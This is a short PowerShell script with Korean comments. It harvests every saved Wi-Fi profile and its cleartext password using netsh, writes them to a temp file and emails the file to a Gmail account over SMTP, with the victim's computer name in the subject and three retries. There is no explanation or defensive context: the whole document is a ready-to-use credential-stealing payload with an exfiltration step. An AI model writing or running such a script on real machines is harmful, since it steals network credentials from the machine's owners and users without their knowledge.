$From = "your.email@gmail.com"
$To = $From
$Password = "your_app_password"
$SMTPServer = "smtp.gmail.com"
$SMTPPort = "587"

# Wi-Fi passwords 수집
$Output = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
    $Profile = ($_ -split ":")[1].Trim()
    $KeyOutput = netsh wlan show profile name="$Profile" key=clear
    $KeyContent = $KeyOutput | Select-String "Key Content"
    "$Profile : " + ($KeyContent -split ":")[1].Trim()
}

# 임시 파일 저장
$FilePath = "$env:TEMP\wifi-passwords.txt"
$Output | Out-File -Encoding UTF8 -FilePath $FilePath

# 메일 전송 3회 재시도
for ($i = 0; $i -lt 3; $i++) {
    try {
        Send-MailMessage -From $From -To $To -Subject "WiFi Passwords from $env:COMPUTERNAME" `
            -Body "Attached Wi-Fi credentials." -SmtpServer $SMTPServer -Port $SMTPPort `
            -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential `
            -ArgumentList $From, (ConvertTo-SecureString $Password -AsPlainText -Force)) `
            -Attachments $FilePath -ErrorAction Stop
        break
    } catch {
        Start-Sleep -Seconds 5
    }
}
